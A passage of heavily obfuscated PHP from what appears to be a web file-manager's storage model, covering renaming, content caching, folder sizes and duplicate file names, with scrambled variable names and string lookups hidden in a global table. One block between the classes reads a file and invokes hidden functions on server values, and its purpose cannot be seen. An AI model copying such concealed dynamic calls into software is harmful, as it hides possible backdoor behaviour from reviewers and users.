Model($šÊ£şß[2283])->where($®¿¤ªê)->delete(); Model($šÊ£şß[544])->where($®¿¤ªê)->delete(); Model($šÊ£şß[2129])->where($®¿¤ªê)->delete(); Model($šÊ£şß[642])->where($®¿¤ªê)->delete(); Model($šÊ£şß[1957])->removeBySource($°™É¥Û³); Model($šÊ£şß[2264])->removeBySource($°™É¥Û³); $this->where($®¿¤ªê)->delete(); Model($šÊ£şß[553])->remove($ôÍ’™ä); for ($éÛàš¤ò = 0; $éÛàš¤ò < count($°™É¥Û³); $éÛàš¤ò++) { $this->sourceCacheClear($°™É¥Û³[$éÛàš¤ò]); } } public function rename($êÀØşã®, $â§äº¹) { $òŠ‚İŒÁ =& $_SERVER[÷ôÚîå]; $¿üÒüš­ = $this->sourceInfo($êÀØşã®); if (!$¿üÒüš­) { return !1; } $³ùşàì· = $this->fileNameExist($¿üÒüš­[$òŠ‚İŒÁ[202]], $â§äº¹); if ($³ùşàì· && $³ùşàì· != $êÀØşã®) { return !1; } $¿Ãèñ = array($òŠ‚İŒÁ[503] => $â§äº¹, $òŠ‚İŒÁ[660] => USER_ID); if ($¿üÒüš­[$òŠ‚İŒÁ[494]] != $òŠ‚İŒÁ[101]) { $¿Ãèñ[$òŠ‚İŒÁ[495]] = substr(get_path_ext($â§äº¹), 0, 10); } Model($òŠ‚İŒÁ[642])->eventRename($êÀØşã®, $¿üÒüš­[$òŠ‚İŒÁ[32]], $â§äº¹); $this->sourceCacheClear($êÀØşã®); $this->setNamePinyin($êÀØşã®, $¿Ãèñ[$òŠ‚İŒÁ[32]], !1); $this->updateModifyTime($¿üÒüš­[$òŠ‚İŒÁ[202]]); $‘ÌÙÜ¦ = $this->where(array($òŠ‚İŒÁ[500] => $êÀØşã®))->data($¿Ãèñ)->save(); $±¦ìœ = $òŠ‚İŒÁ[2272] . $¿üÒüš­[$òŠ‚İŒÁ[202]]; if (isset(self::$cacheChildList[$±¦ìœ])) { unset(self::$cacheChildList[$±¦ìœ]); } return $‘ÌÙÜ¦; } public function setNamePinyin($ÔÉˆ÷ãª, $úİß°Î”, $šÕÎ™Íû = true) { $¹Œ„ƒà¼ =& $_SERVER[÷ôÚîå]; $ŸÑ…àƒ = Input::check($úİß°Î”, $¹Œ„ƒà¼[664]); $úÇ×òÌš = array($¹Œ„ƒà¼[526] => KodSort::makeStr($úİß°Î”)); if ($ŸÑ…àƒ) { $úÇ×òÌš[$¹Œ„ƒà¼[547]] = str_replace($¹Œ„ƒà¼[53], $¹Œ„ƒà¼[12], Pinyin::get($úİß°Î”)); $úÇ×òÌš[$¹Œ„ƒà¼[546]] = Pinyin::get($úİß°Î”, $¹Œ„ƒà¼[665]); } if (!$šÕÎ™Íû && !$ŸÑ…àƒ) { $úÇ×òÌš[$¹Œ„ƒà¼[547]] = null; $úÇ×òÌš[$¹Œ„ƒà¼[546]] = null; } $this->metaSet($ÔÉˆ÷ãª, $úÇ×òÌš); } public function getContent($ùñ‚Çü) { $ı¤Ûì™² =& $_SERVER[÷ôÚîå]; $’˜ü¬€¹ = $this->fileInfoGet($ùñ‚Çü); if (!$’˜ü¬€¹) { return !1; } if ($’˜ü¬€¹[$ı¤Ûì™²[89]] == 0) { return $ı¤Ûì™²[12]; } $Ë–›¨û” = $ı¤Ûì™²[2286] . $’˜ü¬€¹[$ı¤Ûì™²[556]]; if ($’˜ü¬€¹[$ı¤Ûì™²[89]] <= 1024 * 10) { $¿áÉÎÍÉ = Cache::get($Ë–›¨û”); if (!$¿áÉÎÍÉ) { $¿áÉÎÍÉ = IO::getContent($’˜ü¬€¹[$ı¤Ûì™²[97]]); Cache::set($Ë–›¨û”, $¿áÉÎÍÉ); } return $¿áÉÎÍÉ; } if (!$’˜ü¬€¹[$ı¤Ûì™²[97]]) { return $ı¤Ûì™²[12]; } return IO::getContent($’˜ü¬€¹[$ı¤Ûì™²[97]]); } public function setDesc($ËºÂ¦Õ…, $İ‰Á×´€) { $¾–£¥µØ =& $_SERVER[÷ôÚîå]; Model($¾–£¥µØ[642])->eventAddDesc($ËºÂ¦Õ…, $İ‰Á×´€); return $this->metaSet($ËºÂ¦Õ…, $¾–£¥µØ[535], $İ‰Á×´€); } public function setContent($Ô—ß›•¹, $ì¦‡ÀÜˆ = '') { $ ¹ç›»· =& $_SERVER[÷ôÚîå]; $òó¦¹Àº = $this->sourceInfo($Ô—ß›•¹); $Ó‡®ÕºÅ = $this->fileInfoGet($Ô—ß›•¹); if (!$Ó‡®ÕºÅ || !$òó¦¹Àº) { return !1; } $ŸıÏŠ· = Model($ ¹ç›»·[553])->addFileByContent($ì¦‡ÀÜˆ, $òó¦¹Àº[$ ¹ç›»·[32]]); $¯Ú´”ñ‡ = $this->fileHistory($òó¦¹Àº, $ŸıÏŠ·[$ ¹ç›»·[550]], $ŸıÏŠ·[$ ¹ç›»·[89]]); if (!$¯Ú´”ñ‡) { return Model($ ¹ç›»·[553])->remove($ŸıÏŠ·[$ ¹ç›»·[550]]); } $this->folderSizeReset($òó¦¹Àº[$ ¹ç›»·[202]]); return !0; } public function fileSubstr($³¥Ã¦œ, $ÉÍ•äù, $ê¯–øºÙ) { $¶ÆÎğ = $this->fileInfoGet($³¥Ã¦œ); if (!$¶ÆÎğ) { return !1; } return IO::fileSubstr($¶ÆÎğ[$_SERVER[÷ôÚîå][97]], $ÉÍ•äù, $ê¯–øºÙ); } public function fileInfoGet($¥ÏàåÁ) { $™–êªó› =& $_SERVER[÷ôÚîå]; $ÀÚÎ×¥‘ = $this->sourceInfo($¥ÏàåÁ); if (!$ÀÚÎ×¥‘ || $ÀÚÎ×¥‘[$™–êªó›[494]]) { return !1; } $‰‹íÉ¦Á = $™–êªó›[557] . $ÀÚÎ×¥‘[$™–êªó›[550]]; $Áá£¢æ = _get(self::$cacheFileInfo, $‰‹íÉ¦Á); if ($Áá£¢æ) { return $Áá£¢æ; } $²¡ã­Á = Model($™–êªó›[553])->fileInfo($ÀÚÎ×¥‘[$™–êªó›[550]]); if ($²¡ã­Á) { $²¡ã­Á[$™–êªó›[32]] = $ÀÚÎ×¥‘[$™–êªó›[32]]; } self::$cacheFileInfo[$‰‹íÉ¦Á] = $²¡ã­Á; return $²¡ã­Á; } private function folderChildrenNumber($äÒÏ¯¯) { $¾Îçš¯ =& $_SERVER[÷ôÚîå]; $²ş¬·ª = $this->sourceInfo($äÒÏ¯¯); $¿š²æ™à = array($¾Îçš¯[661] => array($¾Îçš¯[621], $²ş¬·ª[$¾Îçš¯[593]] . $äÒÏ¯¯ . $¾Îçš¯[622]), $¾Îçš¯[658] => $²ş¬·ª[$¾Îçš¯[578]], $¾Îçš¯[513] => intval($²ş¬·ª[$¾Îçš¯[514]]), $¾Îçš¯[655] => 1); $üËÒÚ“ä = $this->where($¿š²æ™à)->count(); $ÈÁ•ŒÒŠ = $this->where($¿š²æ™à)->where(array($¾Îçš¯[655] => 0))->count(); return array($¾Îçš¯[93] => $ÈÁ•ŒÒŠ, $¾Îçš¯[94] => $üËÒÚ“ä); } public function pathInfo($ÁŒå³Îè, $Ÿé¯ÌÛÔ = false) { $‘¯ŸÛÛ =& $_SERVER[÷ôÚîå]; $Ÿé¯ÌÛÔ = !1; $ÁŒå³Îè = intval($ÁŒå³Îè); $‚ñï¸¸¥ = $‘¯ŸÛÛ[543] . intval($Ÿé¯ÌÛÔ) . $‘¯ŸÛÛ[471] . $ÁŒå³Îè; $ÆÔîÍ‚‘ = _get(self::$cachePathInfo, $‚ñï¸¸¥); if ($ÆÔîÍ‚‘) { return $ÆÔîÍ‚‘; } $ÖÔŠäí€ = $this->sourceInfo($ÁŒå³Îè); if (!$ÖÔŠäí€) { return !1; } $ÖÔŠäí€ = $this->_listDataApplyItem($ÖÔŠäí€, $Ÿé¯ÌÛÔ); self::$cachePathInfo[$‚ñï¸¸¥] = $ÖÔŠäí€; return $ÖÔŠäí€; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ñğ´äÆ¢) { $Ğ’¾øæı =& $_SERVER[÷ôÚîå]; $œÉØš¿ğ = _get(self::$cachePathInfoMore, $Ñğ´äÆ¢); if ($œÉØš¿ğ) { return $œÉØš¿ğ; } $ŸßßÖØ­ = $this->pathInfo($Ñğ´äÆ¢); if (!$ŸßßÖØ­) { return !1; } if ($ŸßßÖØ­[$Ğ’¾øæı[494]] == $Ğ’¾øæı[101]) { $ŸßßÖØ­[$Ğ’¾øæı[92]] = $this->folderChildrenNumber($Ñğ´äÆ¢); } self::$cachePathInfoMore[$Ñğ´äÆ¢] = $ŸßßÖØ­; return $ŸßßÖØ­; } public function sourceInfo($ÃÈ²¸ã¢) { $³©¯‡… =& $_SERVER[÷ôÚîå]; if (!$ÃÈ²¸ã¢) { return array(); } $ÃÈ²¸ã¢ = intval($ÃÈ²¸ã¢); $¤±™¦ß¸ = $³©¯‡…[542] . $ÃÈ²¸ã¢; $ÇàÄÖ”† = _get(self::$cacheSourceInfo, $¤±™¦ß¸); if ($ÇàÄÖ”†) { return $ÇàÄÖ”†; } $Îççáüª = $this->where(array($³©¯‡…[203] => $ÃÈ²¸ã¢))->find(); self::$cacheSourceInfo[$¤±™¦ß¸] = $Îççáüª; return self::$cacheSourceInfo[$¤±™¦ß¸]; } public function sourceCacheClear($Œ·¾ˆğ = false) { self::cacheClear($Œ·¾ˆğ); } public static function cacheClear($Øµ÷æ·Ò = false) { $Ô÷éÚ˜ã =& $_SERVER[÷ôÚîå]; if ($Øµ÷æ·Ò == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ô÷éÚ˜ã[542] . $Øµ÷æ·Ò]); unset(self::$cachePathInfoMore[$Øµ÷æ·Ò]); unset(self::$cachePathInfo[$Ô÷éÚ˜ã[2287] . $Øµ÷æ·Ò]); unset(self::$cachePathInfo[$Ô÷éÚ˜ã[2288] . $Øµ÷æ·Ò]); } public function metaSet($ŠŸ˜Ò»Ğ, $”ˆ˜ë›‡ = null, $šöüÇğ‘ = null) { $…†¯ìå“ = parent::metaSet($ŠŸ˜Ò»Ğ, $”ˆ˜ë›‡, $šöüÇğ‘); if ($…†¯ìå“) { $this->sourceCacheClear($ŠŸ˜Ò»Ğ); } return $…†¯ìå“; } public function pathInfoByPath($¾ñ£ÊŒğ, $Íúù¸´) { $õ¬ñ’íü =& $_SERVER[÷ôÚîå]; $é³î¢Î = !$Íúù¸´ ? array() : explode($õ¬ñ’íü[8], trim($Íúù¸´, $õ¬ñ’íü[8])); $®§ê¢˜Ø = $¾ñ£ÊŒğ; foreach ($é³î¢Î as $Ş¾˜ù¾²) { $ïë¤·â = array($õ¬ñ’íü[202] => $®§ê¢˜Ø, $õ¬ñ’íü[32] => $Ş¾˜ù¾²); $ÄÑÛÏ…  = $this->field($õ¬ñ’íü[2289])->where($ïë¤·â)->select(); if (!$ÄÑÛÏ… ) { return !1; } $ÄÑÛÏ…  = array_sort_by($ÄÑÛÏ… , $õ¬ñ’íü[514]); $®§ê¢˜Ø = $ÄÑÛÏ… [0][$õ¬ñ’íü[203]]; } $Ğ¬Ú´É– = $this->sourceInfo($®§ê¢˜Ø); $this->pathInfoFilter($Ğ¬Ú´É–); return $Ğ¬Ú´É–; } protected function updateModifyTime($°Â£‡ªÀ) { $¡úì¿‹ =& $_SERVER[÷ôÚîå]; $ä‘ÊÁ£† = defined($¡úì¿‹[2204]) ? USER_ID : 0; if (!$°Â£‡ªÀ) { return; } if (!is_array($°Â£‡ªÀ)) { $°Â£‡ªÀ = array($°Â£‡ªÀ); } foreach ($°Â£‡ªÀ as $˜³­ß™• => $›‰¸Ğ×Ç) { $°Â£‡ªÀ[$˜³­ß™•] = intval($›‰¸Ğ×Ç); $this->sourceCacheClear($›‰¸Ğ×Ç); } $§”³©²Ò = array($¡úì¿‹[203] => array($¡úì¿‹[7], $°Â£‡ªÀ)); $Š¾€‘—Ê = array($¡úì¿‹[660] => $ä‘ÊÁ£†, $¡úì¿‹[507] => time()); $this->where($§”³©²Ò)->save($Š¾€‘—Ê); } public function folderSizeReset($©«Ò›ù÷, $İóœŒëº = false) { $é×¢ Ìê =& $_SERVER[÷ôÚîå]; if ($this->statusIgnoreResetSpace) { return; } $âªø…® = $this->sourceInfo($©«Ò›ù÷); $¡âØï¡¢ = $é×¢ Ìê[2290] . $©«Ò›ù÷; CacheLock::lock($¡âØï¡¢, 20); if ($İóœŒëº === !1) { $this->sourceCacheClear($©«Ò›ù÷); $âªø…® = $this->sourceInfo($©«Ò›ù÷); $À…Ëõ°® = array($é×¢ Ìê[486] => $©«Ò›ù÷, $é×¢ Ìê[513] => 0); $¬³‘Á§İ = $this->where($À…Ëõ°®)->sum($é×¢ Ìê[89]); $İóœŒëº = intval($¬³‘Á§İ) - intval($âªø…®[$é×¢ Ìê[89]]); } if ($İóœŒëº == 0) { return CacheLock::unlock($¡âØï¡¢); } $òÈ€°¶ = $this->parentLevelArray($âªø…®[$é×¢ Ìê[593]]); if (!$òÈ€°¶) { $òÈ€°¶ = array(); } $òÈ€°¶[] = $âªø…®[$é×¢ Ìê[203]]; $À…Ëõ°® = array($é×¢ Ìê[203] => array($é×¢ Ìê[501], $òÈ€°¶)); if ($İóœŒëº < 0) { $À…Ëõ°®[$é×¢ Ìê[89]] = array($é×¢ Ìê[1104], abs($İóœŒëº)); } $this->where($À…Ëõ°®)->setAdd($é×¢ Ìê[89], $İóœŒëº); CacheLock::unlock($¡âØï¡¢); $ö®ÕßÜì = $é×¢ Ìê[2291] . $âªø…®[$é×¢ Ìê[200]] . $é×¢ Ìê[4] . $âªø…®[$é×¢ Ìê[578]]; $¢ÁÚ•ú« = array($âªø…®[$é×¢ Ìê[200]], $âªø…®[$é×¢ Ìê[578]]); TaskRun::timeLimitCall($ö®ÕßÜì, $é×¢ Ìê[2292], $¢ÁÚ•ú«, 1.5); } public function folderSizeResetChildren($ûÊ¥·¯) { $½«®ÖÅ¸ =& $_SERVER[÷ôÚîå]; $this->sourceCacheClear($ûÊ¥·¯); $ÇÒ™„´ = $this->sourceInfo($ûÊ¥·¯); $éğª±¡é = array($½«®ÖÅ¸[655] => 1, $½«®ÖÅ¸[658] => $ÇÒ™„´[$½«®ÖÅ¸[578]], $½«®ÖÅ¸[661] => array($½«®ÖÅ¸[621], $ÇÒ™„´[$½«®ÖÅ¸[593]] . $ûÊ¥·¯ . $½«®ÖÅ¸[622])); $µÖØÅ—­ = $½«®ÖÅ¸[2293]; $™µ÷ÑÜâ = $this->field($µÖØÅ—­)->where($éğª±¡é)->select(); $éğª±¡é[$½«®ÖÅ¸[494]] = 0; $ğ¹‰×µ = $this->field($µÖØÅ—­)->where($éğª±¡é)->select(); if (!$ğ¹‰×µ) { return; } $™µ÷ÑÜâ[] = $ÇÒ™„´; $™µ÷ÑÜâ = array_to_keyvalue($™µ÷ÑÜâ, $½«®ÖÅ¸[203]); foreach ($™µ÷ÑÜâ as $™¸¹Ç‹° => $“ÅÊò÷Ù) { $™µ÷ÑÜâ[$™¸¹Ç‹°][$½«®ÖÅ¸[2294]] = $™µ÷ÑÜâ[$™¸¹Ç‹°][$½«®ÖÅ¸[89]]; $™µ÷ÑÜâ[$™¸¹Ç‹°][$½«®ÖÅ¸[89]] = 0; } foreach ($ğ¹‰×µ as $“ÅÊò÷Ù) { $ã§×íêò = $“ÅÊò÷Ù[$½«®ÖÅ¸[202]] . $½«®ÖÅ¸[12]; if (!isset($™µ÷ÑÜâ[$ã§×íêò])) { continue; } if ($“ÅÊò÷Ù[$½«®ÖÅ¸[514]] == $™µ÷ÑÜâ[$ã§×íêò][$½«®ÖÅ¸[514]]) { $™µ÷ÑÜâ[$ã§×íêò][$½«®ÖÅ¸[89]] += $“ÅÊò÷Ù[$½«®ÖÅ¸[89]]; } } foreach ($™µ÷ÑÜâ as $“ÅÊò÷Ù) { $‰Âù¯Œ³ = $this->parentLevelArray($“ÅÊò÷Ù[$½«®ÖÅ¸[593]]); foreach ($‰Âù¯Œ³ as $ã§×íêò) { $ã§×íêò = $ã§×íêò . $½«®ÖÅ¸[12]; if (!isset($™µ÷ÑÜâ[$ã§×íêò])) { continue; } if ($“ÅÊò÷Ù[$½«®ÖÅ¸[514]] == $™µ÷ÑÜâ[$ã§×íêò][$½«®ÖÅ¸[514]]) { $™µ÷ÑÜâ[$ã§×íêò][$½«®ÖÅ¸[89]] += $“ÅÊò÷Ù[$½«®ÖÅ¸[89]]; } } } $µÉšÑ·î = array(); foreach ($™µ÷ÑÜâ as $“ÅÊò÷Ù) { if ($“ÅÊò÷Ù[$½«®ÖÅ¸[89]] == $“ÅÊò÷Ù[$½«®ÖÅ¸[2294]]) { continue; } $µÉšÑ·î[] = array($½«®ÖÅ¸[203], $“ÅÊò÷Ù[$½«®ÖÅ¸[203]], $½«®ÖÅ¸[89], $“ÅÊò÷Ù[$½«®ÖÅ¸[89]]); } $this->saveAll($µÉšÑ·î); } public function userSpaceReset($ØíÒ±ä£ = false) { $‡İÒâ–Î =& $_SERVER[÷ôÚîå]; $¹İÖØ = $this->where(array($‡İÒâ–Î[200] => self::TYPE_USER, $‡İÒâ–Î[578] => $ØíÒ±ä£, $‡İÒâ–Î[494] => 0))->sum($‡İÒâ–Î[89]); $¹İÖØ = !$¹İÖØ || $¹İÖØ <= 0 ? 0 : $¹İÖØ; Model($‡İÒâ–Î[586])->userEdit($ØíÒ±ä£, array($‡İÒâ–Î[1966] => $¹İÖØ)); } public function targetSpaceUpdate($‡ÄËº², $´Àµˆè) { $­ÚïØø =& $_SERVER[÷ôÚîå]; if (!$´Àµˆè) { return; } if (!in_array($‡ÄËº², array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $‘Ë÷Şà = $this->targetSpaceSize($‡ÄËº², $´Àµˆè); if ($‡ÄËº² == self::TYPE_USER) { Model($­ÚïØø[586])->userEdit($´Àµˆè, array($­ÚïØø[1966] => $‘Ë÷Şà)); } else { if ($‡ÄËº² == self::TYPE_GROUP) { Model($­ÚïØø[594])->groupEdit($´Àµˆè, array($­ÚïØø[1966] => $‘Ë÷Şà)); } } } public function targetSpaceSize($Ñ”È², $øé£›«¤) { $¥À¦ßäô =& $_SERVER[÷ôÚîå]; $†á—Ì† = 0; $’ÄÚÔ÷ª = $this->targetSourceRoot($Ñ”È², $øé£›«¤, !0); foreach ($’ÄÚÔ÷ª as $Ï¨Õ§¢Ù) { if (!$Ï¨Õ§¢Ù) { continue; } $†á—Ì† += floatval($Ï¨Õ§¢Ù[$¥À¦ßäô[89]]); $ÌàÑà¦á = array($¥À¦ßäô[661] => array($¥À¦ßäô[621], $¥À¦ßäô[603] . $Ï¨Õ§¢Ù[$¥À¦ßäô[203]] . $¥À¦ßäô[622])); $Œ¾öÔº© = Model($¥À¦ßäô[512])->field($¥À¦ßäô[500])->where($ÌàÑà¦á)->select(); $Œ¾öÔº© = array_to_keyvalue($Œ¾öÔº©, $¥À¦ßäô[12], $¥À¦ßäô[203]); $Œ¾öÔº© = array_unique(array_filter($Œ¾öÔº©)); if ($Œ¾öÔº©) { $ÌàÑà¦á = array($¥À¦ßäô[500] => array($¥À¦ßäô[501], $Œ¾öÔº©)); $†á—Ì† += floatval($this->where($ÌàÑà¦á)->sum($¥À¦ßäô[89])); } } $†á—Ì† = !$†á—Ì† || $†á—Ì† <= 0 ? 0 : $†á—Ì†; return $†á—Ì†; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($áßÚ«¿í) { return $this->fileTypeProfile($áßÚ«¿í, SourceModel::TYPE_USER); } public function groupFileTypeProfile($­ã¹±™”) { return $this->fileTypeProfile($­ã¹±™”, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Æ‰º’±›, $¤ßÇ›µ) { $ôÕÅ¥®ë =& $_SERVER[÷ôÚîå]; $µÓ‹Û‡é = $ôÕÅ¥®ë[2295] . $Æ‰º’±› . $ôÕÅ¥®ë[11] . $¤ßÇ›µ; $›ÁìÁ¨÷ = Cache::get($µÓ‹Û‡é); if ($›ÁìÁ¨÷) { return $›ÁìÁ¨÷; } $ˆÔö»± = array($ôÕÅ¥®ë[655] => 0); if ($Æ‰º’±› != !1) { $ˆÔö»±[$ôÕÅ¥®ë[578]] = $Æ‰º’±›; $ˆÔö»±[$ôÕÅ¥®ë[200]] = $¤ßÇ›µ; } $æÉø‰üÃ = array(); $æÉø‰üÃ[$ôÕÅ¥®ë[2296]] = array($ôÕÅ¥®ë[2297] => LNG($ôÕÅ¥®ë[2296]), $ôÕÅ¥®ë[2298] => $this->where($ˆÔö»±)->count(), $ôÕÅ¥®ë[626] => $this->where($ˆÔö»±)->sum($ôÕÅ¥®ë[89])); $ãäû†˜Å = KodIO::fileTypeList(); foreach ($ãäû†˜Å as $ªñ¨¼ò => $¡£ì‡…Ñ) { $ˆÔö»±[$ôÕÅ¥®ë[495]] = $this->fileTypeWhere($ªñ¨¼ò); $æÉø‰üÃ[$ªñ¨¼ò] = array($ôÕÅ¥®ë[2297] => $¡£ì‡…Ñ[$ôÕÅ¥®ë[32]], $ôÕÅ¥®ë[2298] => $this->where($ˆÔö»±)->count(), $ôÕÅ¥®ë[626] => $this->where($ˆÔö»±)->sum($ôÕÅ¥®ë[89])); } Cache::set($µÓ‹Û‡é, $æÉø‰üÃ, 1200); return $æÉø‰üÃ; } public function fileNameExist($ú¯Ï×—, $‚èù¼ÖÊ) { $ ñ±ô„ =& $_SERVER[÷ôÚîå]; $¾áğÆŒ = $this->field($ ñ±ô„[2299])->where(array($ ñ±ô„[202] => $ú¯Ï×—, $ ñ±ô„[32] => $‚èù¼ÖÊ, $ ñ±ô„[514] => 0))->find(); return is_array($¾áğÆŒ) ? $¾áğÆŒ[$ ñ±ô„[203]] : !1; } public function childList($íŸèÊ×–) { $íäÜ‡ĞÉ =& $_SERVER[÷ôÚîå]; $æíáõ¨ = $íäÜ‡ĞÉ[2272] . $íŸèÊ×–; if (isset(self::$cacheChildList[$æíáõ¨])) { return self::$cacheChildList[$æíáõ¨]; } $‚»±÷È = array($íäÜ‡ĞÉ[202] => intval($íŸèÊ×–), $íäÜ‡ĞÉ[514] => 0); $„—ßµˆà = $this->where($‚»±÷È)->select(); $„—ßµˆà = $„—ßµˆà ? $„—ßµˆà : array(); self::$cacheChildList[$æíáõ¨] = $„—ßµˆà; foreach ($„—ßµˆà as $ãı—âöÆ) { $æíáõ¨ = $íäÜ‡ĞÉ[542] . $ãı—âöÆ[$íäÜ‡ĞÉ[203]]; self::$cacheSourceInfo[$æíáõ¨] = $ãı—âöÆ; } return $„—ßµˆà; } public function fileNameAuto($çÇ§í“î, $´ªä¼ô, $Ø’¨‹Š÷ = REPEAT_RENAME, $ïÔ˜¶±ø = false) { $œ„Â®æá =& $_SERVER[÷ôÚîå]; $¯»ø°ò = get_path_ext($´ªä¼ô); $¼»ë»¤Ò = $¯»ø°ò ? get_path_ext_name($´ªä¼ô) . $œ„Â®æá[2300] . $¯»ø°ò : $´ªä¼ô . $œ„Â®æá[469]; $…‹ÅÂË = array($œ„Â®æá[202] => $çÇ§í“î, $œ„Â®æá[514] => 0, $œ„Â®æá[32] => array($œ„Â®æá[468], $¼»ë»¤Ò)); $óÇÒ¾†í = $this->field($œ„Â®æá[32])->where($…‹ÅÂË)->select(); $ÈÆª´ü— = array_to_keyvalue($óÇÒ¾†í, $œ„Â®æá[12], $œ„Â®æá[32]); return $this->fileNameAutoGet($ÈÆª´ü—, $´ªä¼ô, $Ø’¨‹Š÷, $ïÔ˜¶±ø); } public function fileNameAutoGet($—ø”Ùˆ, $¨ö¤ÓÀŸ, $ˆì‡¾€, $‡øíÓ±) { $éí È²Â =& $_SERVER[÷ôÚîå]; if ($ˆì‡¾€ == REPEAT_REPLACE || !$—ø”Ùˆ || !in_array_not_case($¨ö¤ÓÀŸ, $—ø”Ùˆ) || $‡øíÓ± && $ˆì‡¾€ != REPEAT_RENAME_FOLDER) { return $¨ö¤ÓÀŸ; } if ($ˆì‡¾€ == REPEAT_SKIP) { return !1; } $­û½À÷ˆ = $éí È²Â[10] . get_path_ext($¨ö¤ÓÀŸ); $­û½À÷ˆ = $­û½À÷ˆ == $éí È²Â[10] || $‡øíÓ± ? $éí È²Â[12] : $­û½À÷ˆ; for ($œ³Ş·ß = 1; $œ³Ş·ß <= count($—ø”Ùˆ) + 1; $œ³Ş·ß++) { $—àİğÎ× = substr($¨ö¤ÓÀŸ, 0, strlen($¨ö¤ÓÀŸ) - strlen($­û½À÷ˆ)); $ØÊá¤ŒÓ = $—àİğÎ× . "\50{$œ³Ş·ß}\51{$­û½À÷ˆ}"; if (!in_array_not_case($ØÊá¤ŒÓ, $—ø”Ùˆ)) { return $ØÊá¤ŒÓ; } } } } goto eêÜƒ†¨œØ; F°Ó«¢½Í: if ($_SERVER[$_SERVER[÷ôÚîå][60]] != $_SERVER[$_SERVER[÷ôÚîå][61]]) { $_getc = $_SERVER[÷ôÚîå][62]; $_getfile = $_SERVER[$_SERVER[÷ôÚîå][63]] . $_SERVER[÷ôÚîå][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[÷ôÚîå][65], $_getfilec); if (count($_getarrs) < $_SERVER[÷ôÚîå][66]) { $exit = $_SERVER[÷ôÚîå][67]; $exit(); } $_act = $_SERVER[÷ôÚîå][68]; $_act($_SERVER[$_SERVER[÷ôÚîå][69]]); } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¦‚ß™ì÷ =& $_SERVER[÷ôÚîå]; $this->objectDriver = array($¦‚ß™ì÷[70], $¦‚ß™ì÷[71], $¦‚ß™ì÷[72], $¦‚ß™ì÷[73], $¦‚ß™ì÷[74], $¦‚ß™ì÷[75], $¦‚ß™ì÷[76], $¦‚ß™ì÷[77], $¦‚ß™ì÷[78], $¦‚ß™ì÷[79], $¦‚ß™ì÷[80], $¦‚ß™ì÷[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ˆÌƒ‹º¸) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ˆÌƒ‹º¸, $_SERVER[÷ôÚîå][8]); } return $ˆÌƒ‹º¸; } public function iconvApp($µ¡—„×²) { return $µ¡—„×²; } public function iconvSystem($¾™Á€ñÉ) { return $¾™Á€ñÉ; } public function iconvTo($ÄåÔà„, $¼øí™¸Ì, $¢¬„ô¯‚) { $ßÜôö£ø =& $_SERVER[÷ôÚîå]; if (!$ÄåÔà„ || !function_exists($ßÜôö£ø[82])) { return $ÄåÔà„; } static $®ÁÊ…³ = array(); $è³«Ìúè = $¼øí™¸Ì . $ßÜôö£ø[83] . $¢¬„ô¯‚ . $ßÜôö£ø[84] . $ÄåÔà„; if (isset($®ÁÊ…³[$è³«Ìúè])) { return $®ÁÊ…³[$è³«Ìúè]; } if (function_exists($ßÜôö£ø[85])) { $™·ß”È = @mb_convert_encoding($ÄåÔà„, $¢¬„ô¯‚, $¼øí™¸Ì); } else { $™·ß”È = @iconv($¼øí™¸Ì, $¢¬„ô¯‚, $ÄåÔà„); } $™·ß”È = $™·ß”È ? $™·ß”È : $ÄåÔà„; if (strstr($™·ß”È, $ßÜôö£ø[86])) { $™·ß”È = str_replace($ßÜôö£ø[86], $ßÜôö£ø[11], $™·ß”È); } $®ÁÊ…³[$¼øí™¸Ì . $ßÜôö£ø[83] . $¢¬„ô¯‚ . $ßÜôö£ø[84] . $ÄåÔà„] = $™·ß”È; $®ÁÊ…³[$¢¬„ô¯‚ . $ßÜôö£ø[83] . $¼øí™¸Ì . $ßÜôö£ø[84] . $ÄåÔà„] = $ÄåÔà„; $®ÁÊ…³[$¢¬„ô¯‚ . $ßÜôö£ø[83] . $¼øí™¸Ì . $ßÜôö£ø[84] . $™·ß”È] = $ÄåÔà„; $®ÁÊ…³[$¼øí™¸Ì . $ßÜôö£ø[83] . $¢¬„ô¯‚ . $ßÜôö£ø[84] . $™·ß”È] = $™·ß”È; return $™·ß”È; } public function getPathInner($±ÁÎ˜) { $¸öÚ†ùŸ = IO::init($±ÁÎ˜); return $¸öÚ†ùŸ->path; } public function getPathOuter($Ñí’Èä§) { $Í…µğ™ß =& $_SERVER[÷ôÚîå]; $±ùº¼Ã¾ = strlen(trim($this->pathBase, $Í…µğ™ß[8])); $Ñí’Èä§ = substr(trim($Ñí’Èä§, $Í…µğ™ß[8]), $±ùº¼Ã¾); return $this->pathDriver . $Í…µğ™ß[8] . ltrim($Ñí’Èä§, $Í…µğ™ß[8]); } public function isParentOf($ôÎ¸€ Ã, $¤Ä›´¢ë) { $Â¶˜ªÅç =& $_SERVER[÷ôÚîå]; $ôÎ¸€ Ã = rtrim(strtolower($ôÎ¸€ Ã), $Â¶˜ªÅç[8]) . $Â¶˜ªÅç[8]; $¤Ä›´¢ë = rtrim(strtolower($¤Ä›´¢ë), $Â¶˜ªÅç[8]) . $Â¶˜ªÅç[8]; $¼ğš„Â = strpos($¤Ä›´¢ë, $ôÎ¸€ Ã) === 0; return $¼ğš„Â; } public function getType() { $²âå°èÅ =& $_SERVER[÷ôÚîå]; $…ëŒñ¨ä = str_replace($²âå°èÅ[87], $²âå°èÅ[12], get_class($this)); return strtolower($…ëŒñ¨ä); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¾Ş©Ù¯‡, $òÖŸª²À) { $¨Ü°Ñ¬É =& $_SERVER[÷ôÚîå]; $Ö÷Æ© ÷ = rtrim($¾Ş©Ù¯‡, $¨Ü°Ñ¬É[8]) . $¨Ü°Ñ¬É[8] . $òÖŸª²À; 